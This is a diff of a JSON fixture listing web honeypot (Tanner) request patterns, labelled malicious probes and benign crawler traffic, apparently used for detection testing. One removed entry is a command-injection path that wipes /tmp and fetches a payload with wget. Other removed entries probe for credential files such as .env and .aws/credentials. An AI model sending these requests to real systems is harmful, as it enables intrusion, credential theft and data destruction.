@@ -2,20 +2,132 @@
   "_comment": "Tanner(Web/HTTPハニーポット)の実観測パターン。malicious_paths=認証情報/設定ファイル探索やWebShell探索（悪性）、benign_paths=クローラ/正常巡回（良性ノイズ）。Tanner は送信元を peer.ip で表す。",
   "sensor": "tpot-sensor-01",
   "malicious_paths": [
-    {"method": "GET", "path": "/.env", "user_agent": "python-requests/2.28.0"},
-    {"method": "GET", "path": "/.aws/credentials", "user_agent": "python-requests/2.31.0"},
-    {"method": "GET", "path": "/.git/config", "user_agent": "Go-http-client/1.1"},
-    {"method": "POST", "path": "/boaform/admin/formLogin", "user_agent": "Mozilla/5.0 zgrab/0.x"},
-    {"method": "GET", "path": "/shell?cd+/tmp;rm+-rf+*;wget+http://0.0.0.0/jaws", "user_agent": "Hello, World"},
-    {"method": "GET", "path": "/wp-login.php", "user_agent": "Mozilla/5.0 (compatible)"},
-    {"method": "POST", "path": "/cgi-bin/luci/;stok=/locale", "user_agent": "curl/7.68.0"},
-    {"method": "GET", "path": "/actuator/env", "user_agent": "python-httpx/0.24"}
+    {
+      "method": "GET",
+      "path": "/",
+      "user_agent": "l9tcpid/v1.1.0"
+    },
+    {
+      "method": "GET",
+      "path": "/login",
+      "user_agent": "Go-http-client/1.1"
+    },
+    {
+      "method": "GET",
+      "path": "/projects?jump=welcome",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/"
+    },
+    {
+      "method": "GET",
+      "path": "/search",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/"
+    },
+    {
+      "method": "GET",
+      "path": "/account/register",
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/"
+    },
+    {
+      "method": "GET",
+      "path": "/api/setup-complete",
+      "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"
+    },
+    {
+      "method": "POST",
+      "path": "/api/v1/fabric_device_auth/fortigate/init",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/api/v1/login",
+      "user_agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; en-us) AppleWebKit/525.25 (KHTML, like Gecko) Version/3.2 Safari/525.2"
+    },
+    {
+      "method": "GET",
+      "path": "/contact-us/",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/v1/users/login",
+      "user_agent": "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/registration/",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/adminer.php",
+      "user_agent": "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/wp-content/plugins/nmedia-user-file-uploader/readme.txt",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/RemoteControlAuth/api/Auth",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/signin",
+      "user_agent": "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/api/v1/auth/force-reset-password",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/api/backup",
+      "user_agent": "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "GET",
+      "path": "/api/v1/init_consts",
+      "user_agent": "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+    },
+    {
+      "method": "POST",
+      "path": "/mcp_message",
+      "user_agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
+    },
+    {
+      "method": "GET",
+      "path": "/api/v1/monitor/messages",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0 (x64 de)"
+    }
   ],
   "benign_paths": [
-    {"method": "GET", "path": "/", "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
-    {"method": "GET", "path": "/robots.txt", "user_agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
-    {"method": "GET", "path": "/favicon.ico", "user_agent": "Mozilla/5.0 (compatible; Censys/1.0)"},
-    {"method": "GET", "path": "/", "user_agent": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"},
-    {"method": "HEAD", "path": "/", "user_agent": "Expanse, a Palo Alto Networks company"}
+    {
+      "method": "GET",
+      "path": "/",
+      "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+    },
+    {
+      "method": "GET",
+      "path": "/robots.txt",
+      "user_agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+    },
+    {
+      "method": "GET",
+      "path": "/favicon.ico",
+      "user_agent": "Mozilla/5.0 (compatible; Censys/1.0)"
+    },
+    {
+      "method": "GET",
+      "path": "/",
+      "user_agent": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+    },
+    {
+      "method": "HEAD",
+      "path": "/",
+      "user_agent": "Expanse, a Palo Alto Networks company"
+    }
   ]
 }
